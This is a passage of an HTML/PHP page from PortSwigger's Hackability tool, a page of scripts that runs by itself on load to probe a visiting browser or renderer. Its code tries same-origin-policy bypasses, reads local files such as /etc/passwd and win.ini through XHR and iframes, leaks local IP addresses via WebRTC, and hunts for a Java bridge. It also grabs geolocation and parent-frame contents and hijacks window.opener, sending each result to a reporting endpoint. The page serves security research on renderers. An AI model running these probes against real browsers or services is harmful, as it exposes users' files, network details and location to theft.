			},2000);
		});
	}
}();
</script>
<script>
!function(){
	function sopCheck() {
		var iframe = document.createElement('iframe');
		iframe.src = 'http://subdomain1.portswigger-labs.net';
		iframe.onload = function(){
			try {
				this.contentWindow.location.toString();
				Hackability.makeRequest("exploit_sop_disabled_iframe");
				Hackability.generateRow(true, "SOP bypassed");
			} catch(e){
				Hackability.makeRequest("info_sop_enabled_iframe");
				Hackability.generateRow(false, "SOP not bypassed");
			}
		};
		document.querySelector('.render').appendChild(iframe);
	}
	sopCheck();
}();
</script>
<script>
!function(){
	Hackability.xhrCheck = function(url, type, info, msgTrue, msgFalse) {
		var req;
		if(window.XMLHttpRequest) {
			req = new XMLHttpRequest();
		} else {
			req = new ActiveXObject("Microsoft.XMLHTTP");
		}
		req.open("GET", url, true);
		req.onreadystatechange = function(){
			if(req.readyState === 4) {
				if(req.responseText.length) {
					Hackability.makeRequest(type+'&contents='+encodeURIComponent(req.responseText));
					Hackability.generateRow(true, msgTrue);
				} else {
					Hackability.makeRequest(info);
					Hackability.generateRow(false, msgFalse);
				}
			}
		};
		req.send(null);
	}

	try {
		Hackability.xhrCheck("http://subdomain1.portswigger-labs.net", "exploit_xdomain_xhr", "info_xhr_security_not_bypassed",
			"XHR security bypassed","XHR security not bypassed");
	} catch(e){
		Hackability.makeRequest("info_xhr_security_not_bypassed");
		Hackability.generateRow(false, "XHR security not bypassed");
	}
}();
</script>
<script>
!function(){
	var foundConstructor = false;
	function traverse(obj, depth, path) {
		var max = 3;
		for(var i in obj) {
			if(foundConstructor) {
				return false;
			}
			if(obj[i]===obj) {
				continue;
			}
			try {
				obj[i].constructor;
			} catch(e){
				if(/java/i.test(e)) {
					foundConstructor = true;
					Hackability.makeRequest("exploit_java_bridge&exception="+encodeURIComponent(e));
					Hackability.generateRow(true, "Java Bridge exists:exception="+e);
					return false;
				}
			}
			if(obj[i] && typeof obj[i] === 'object')
			try {
				obj[i].getClass().forName("java.net.Socket").newInstance();
				foundConstructor = true; 
				Hackability.makeRequest("exploit_java_bridge&class="+encodeURIComponent(obj[i].getClass().getName()));
				Hackability.generateRow(true, "Java Bridge exists:class="+obj[i].getClass().getName()+', path='+path+'.'+i);
				return false;
			} catch(e){}

			try {
				if(obj[i] && depth < max) {
					traverse(obj[i], depth+1, path + '.' + i);
				}
			} catch(e){}
		}
	}
	if(window.addEventListener) {
		window.addEventListener('load', function(){
			setTimeout(function(){
				traverse(window, 0, 'window');
				if(!foundConstructor) {
					Hackability.makeRequest("info_no_java_bridge");
					Hackability.generateRow(false, "Java Bridge does not exist");
				}
			},2000);
		},false);
	} else if(window.attachEvent) {
		window.attachEvent('onload', function(){
			setTimeout(function(){
				traverse(window, 0, 'window');
				if(!foundConstructor) {
					Hackability.makeRequest("info_no_java_bridge");
					Hackability.generateRow(false, "Java Bridge does not exist");
				}
			},2000);
		});		
	}
}();
</script>
<script>
if(window.callPhantom) {
	Hackability.makeRequest("info_call_phantom_exists");
	Hackability.generateRow(true, "PhantomJS detected");
} else {
	Hackability.makeRequest("info_call_phantom_does_not_exist");
	Hackability.generateRow(false, "PhantomJS not detected");
}
</script>
<script>
if(location.hostname !== '<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?>') {
	Hackability.makeRequest("info_different_location&url="+encodeURIComponent(location));
	Hackability.generateRow(false, "Is at a different location. url="+url);
} else {
	Hackability.makeRequest("info_same_location");
	Hackability.generateRow(false, "Is not at a different location");
}
</script>
<script>
!function(){
	var canSvg = !!(document.createElementNS && document.createElementNS('http://www.w3.org/2000/svg','svg').createSVGRect);
	if(canSvg) {
		Hackability.makeRequest("info_svg_is_supported");
		Hackability.generateRow(true, "SVG is supported");
	} else {
		Hackability.makeRequest("info_svg__is_not_supported");
		Hackability.generateRow(false, "SVG is not supported");
	}
}();
</script>
<script>
if(Object.defineProperty) {
	Hackability.makeRequest("info_es5_is_supported");
	Hackability.generateRow(true, "ES5 is supported");
} else {
	Hackability.makeRequest("info_es5_is_not_supported");
	Hackability.generateRow(false, "ES5 is not supported");	
}
</script>
<script>
!function(){
	try {
		eval("class x{}");
		Hackability.makeRequest("info_es6_is_supported");
		Hackability.generateRow(true, "ES6 is supported");
	} catch(e){
		Hackability.makeRequest("info_es6_is_not_supported");
		Hackability.generateRow(false, "ES6 is not supported");
	}
}();
</script>
<script>
if(!'a'[0]) {
	Hackability.makeRequest("info_older_ie");
	Hackability.generateRow(true, "Older IE detected");
}
</script>
<script>
if('\u' === 'u') {
	Hackability.makeRequest("info_safari_like");
	Hackability.generateRow(true, "Safari like behaviour");
}
</script>
<script>
if(window.Components) {
	Hackability.makeRequest("info_mozilla_like");
	Hackability.generateRow(true, "Mozilla like behaviour");	
}
</script>
<script>
!function(){
	if(top.location != self.location) {
		var loc = '', contents = '';	
		try {
			loc = top.location;
		} catch(e){}
		try {
			contents = top.document.documentElement.innerHTML;
		} catch(e){}
		Hackability.generateRow(true, "Is Iframed");
		Hackability.makeRequest("info_framed&location="+encodeURIComponent(loc)+'&contents='+encodeURIComponent(contents));
	} else {
		Hackability.generateRow(false, "Is not iframed");
	}
}();
</script>
<script>
!function(){
	if(window.opener) {
		var loc = '';
		try {
			loc = window.opener.location;
		} catch(e){}
			Hackability.makeRequest("info_opener&location="+encodeURIComponent(loc));
			Hackability.generateRow(true, "Page opened from another window");
		try {
			window.opener.location = Hackability.generateRequestUrl('info_opener_redirection');
		} catch(e){}
	}
}();
</script>
<script>
if(location.origin && location.origin === 'null') {
	Hackability.makeRequest("info_iframe_sandboxed");
	Hackability.generateRow(true, "Page is iframed sandboxed");
} else {
	Hackability.generateRow(false, "Page is not iframed sandboxed");
}
</script>
<script>
!function(){
	var win = window.open(Hackability.generateRequestUrl('info_popups'));
	if(win) {
		Hackability.generateRow(true, "Popups are allowed");
	} else {
		Hackability.generateRow(false, "Popups are not allowed");
	}
	if(win)win.close();
}();
</script>
<iframe class="iframe_webrtc" sandbox="allow-same-origin" style="display: none"></iframe>
<script>
!function(){
	//get the IP addresses associated with an account
	function getIPs(callback){
	    var ip_dups = {};

	    //compatibility for firefox and chrome
	    var RTCPeerConnection = window.RTCPeerConnection
	        || window.mozRTCPeerConnection
	        || window.webkitRTCPeerConnection;
	    var useWebKit = !!window.webkitRTCPeerConnection;

	    //bypass naive webrtc blocking using an iframe
	    if(!RTCPeerConnection){
	        //NOTE: you need to have an iframe in the page right above the script tag
	        //
	        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
	        //<script>...getIPs called in here...
	        //
	        var win = document.querySelector('.iframe_webrtc').contentWindow;
	        RTCPeerConnection = win.RTCPeerConnection
	            || win.mozRTCPeerConnection
	            || win.webkitRTCPeerConnection;
	        useWebKit = !!win.webkitRTCPeerConnection;
	    }

	    //minimal requirements for data connection
	    var mediaConstraints = {
	        optional: [{RtpDataChannels: true}]
	    };

	    var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};
	    if(!RTCPeerConnection) {
	    	return;
	    }
	    //construct a new RTCPeerConnection
	    var pc = new RTCPeerConnection(servers, mediaConstraints);

	    function handleCandidate(candidate){
	        //match just the IP address
	        var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
	        var ip_addr = ip_regex.exec(candidate)[1];

	        //remove duplicates
	        if(ip_dups[ip_addr] === undefined)
	            callback(ip_addr);

	        ip_dups[ip_addr] = true;
	    }

	    //listen for candidate events
	    pc.onicecandidate = function(ice){

	        //skip non-candidate events
	        if(ice.candidate)
	            handleCandidate(ice.candidate.candidate);
	    };

	    //create a bogus data channel
	    pc.createDataChannel("");

	    //create an offer sdp
	    pc.createOffer(function(result){

	        //trigger the stun server request
	        pc.setLocalDescription(result, function(){}, function(){});

	    }, function(){});

	    //wait for a while to let everything done
	    setTimeout(function(){
	        //read candidate info from local description
	        var lines = pc.localDescription.sdp.split('\n');

	        lines.forEach(function(line){
	            if(line.indexOf('a=candidate:') === 0)
	                handleCandidate(line);
	        });
	    }, 1000);
	}
	getIPs(function(ip){
	    if (ip.match(/^(192\.168\.|169\.254\.|10\.|172\.(1[6-9]|2\d|3[01]))/)) {
	    	Hackability.makeRequest("exploit_local_ip&ip="+encodeURIComponent(ip));
	    	Hackability.generateRow(true, "Local IP detected:"+ip);
	    } else if (ip.match(/^[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}$/)) {
	        Hackability.makeRequest("exploit_local_ip&ip="+encodeURIComponent(ip));
	        Hackability.generateRow(true, "Local IP detected:"+ip);
	    } else {
	    	Hackability.generateRow(false, "Local IP could not be obtained");
	    }
	});
}();
</script>
<script>
Hackability.iframe_handler = function(iframe, type, msg){
	function isInterestingUrl(url) {
    var a = document.createElement('a');
    try {
      url = url + '';
		} catch(e){
      return true;
    }
    a.href = url;
		return url !== 'about:blank' && url !== '' && a.host !== '<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?>';
	}
	var contents = '', url = '';
	try {
		url = iframe.contentWindow.location+'';
	} catch(e){
    url = '';
  }
	try {
		contents = iframe.contentWindow.document.documentElement.innerHTML+'';
	} catch(e){
    contents = '';
  }
	if(!/IGNORE THIS CONTENTS/i.test(contents) && isInterestingUrl(url) && contents.length) {
		Hackability.makeRequest(type+'?&url='+encodeURIComponent(url)+'&contents='+encodeURIComponent(contents));
		Hackability.generateRow(true,msg+':url='+url+', contents='+contents);
	} 
};
</script>
<script>
Hackability.print = function(){
  function afterPrint() {
      Hackability.makeRequest("info_allows_printing");
      Hackability.generateRow(true,"Allows printing");
  }
  if (window.matchMedia) {
      var mediaQueryList = window.matchMedia('print');
      mediaQueryList.addListener(function(mql) {
          if(!mql.matches) {
              afterPrint();
          }
      });
  } else {
    window.onafterprint = afterPrint;
  }
  window.print();
};
</script>
<script>
if(navigator.geolocation && navigator.geolocation.getCurrentPosition) {
  navigator.geolocation.getCurrentPosition(function(position) {
    Hackability.makeRequest("info_geolocation&lat="+position.coords.latitude+"&long="+position.coords.longitude);
    Hackability.generateRow(true, "Geo location allowed:lat="+position.coords.latitude+"&long="+position.coords.longitude);
  });
}
</script>
<script>
Hackability.createIframe = function(src, msg, type){
	var iframe = document.createElement('iframe');
	iframe.src = src;
	iframe.onreadystatechange = iframe.onload = function(){
		Hackability.iframe_handler(this, type, msg);
	};
	document.body.appendChild(iframe);
};
</script>
<script>
Hackability.runExploits = function() {
  var q = [];
	try {
		Hackability.xhrCheck("file://etc/passwd", "exploit_linux_filesystem_xhr", "info_xhr_security_linux_not_bypassed",
			"XHR security filesystem linux bypassed","XHR security filesystem linux not bypassed");
	} catch(e){
		Hackability.makeRequest("info_xhr_security_filesystem_linux_not_bypassed");
		Hackability.generateRow(false, "XHR security filesystem linux not bypassed");
	}
	try {
		Hackability.xhrCheck("c:\\windows\\win.ini", "exploit_windows_filesystem_xhr", "info_xhr_security_windows_not_bypassed",
			"XHR security filesystem windows bypassed","XHR security filesystem windows not bypassed");
	} catch(e){
		Hackability.makeRequest("info_xhr_security_filesystem_windows_not_bypassed");
		Hackability.generateRow(false, "XHR security filesystem windows not bypassed");
	}
  q.push(function(){
    try {
      Hackability.createIframe('file:c:\\windows\\win.ini', 'Iframe security filesystem windows bypassed', 'exploit_local_file_iframe_windows'); 
    } catch(e){console.log(e);} 
  });
	q.push(function(){
	 try {
    Hackability.createIframe('file://etc/passwd', 'Iframe security filesystem linux bypassed', 'exploit_local_file_iframe_linux');
   } catch(e){console.log(e);} 
	});
  q.push(function(){
    try {
      Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=http&os=windows','Iframe security filesystem windows redirect bypassed','exploit_local_file_iframe_redirect_windows');
    } catch(e){console.log(e);} 
	});
  q.push(function(){
    try {
      Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=http&os=linux','Iframe security filesystem linux redirect bypassed','exploit_local_file_iframe_redirect_linux');
    } catch(e){console.log(e);}  
	});
  q.push(function(){
    try {
      Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=meta&os=windows','Iframe security filesystem windows meta redirect bypassed','exploit_local_file_iframe_redirect_windows');
    } catch(e){console.log(e);} 
	});
  q.push(function(){
    try {
      Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=meta&os=linux','Iframe security filesystem linux meta redirect bypassed','exploit_local_file_iframe_redirect_linux');
    } catch(e){console.log(e);} 
	});
  q.push(function(){
    try {
      Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=javascript&os=windows','Iframe security filesystem windows js redirect bypassed','exploit_local_file_iframe_redirect_windows');
    } catch(e){console.log(e);} 
	});
  q.push(function(){
    try {
      Hackability.createIframe('http://<?php echo htmlentities($_SERVER['HTTP_HOST'], ENT_QUOTES)?><?php echo htmlentities($path,ENT_QUOTES)?>tests/redirect.php?redirectType=javascript&os=linux','Iframe security filesystem linux js redirect bypassed','exploit_local_file_iframe_redirect_linux');
    } catch(e){console.log(e);} 
  });
  setTimeout(function f(){
      if(q.length) {
        try {
          q.shift()();
        } catch(e){}
        setTimeout(f, 1500);
      }
  }, 1500);
};
</script>
<script>
if(window.addEventListener) {
	window.addEventListener('load', function(){
		setTimeout(function(){
			Hackability.runExploits();
      Hackability.print();
		}, 5000);
	}, false); 
} else if(window.attachEvent) {
	window.attachEvent('onload', function(){
		setTimeout(function(){
			Hackability.runExploits();
      Hackability.print();
		}, 5000);
	}); 
}
</script>
</body>
</html>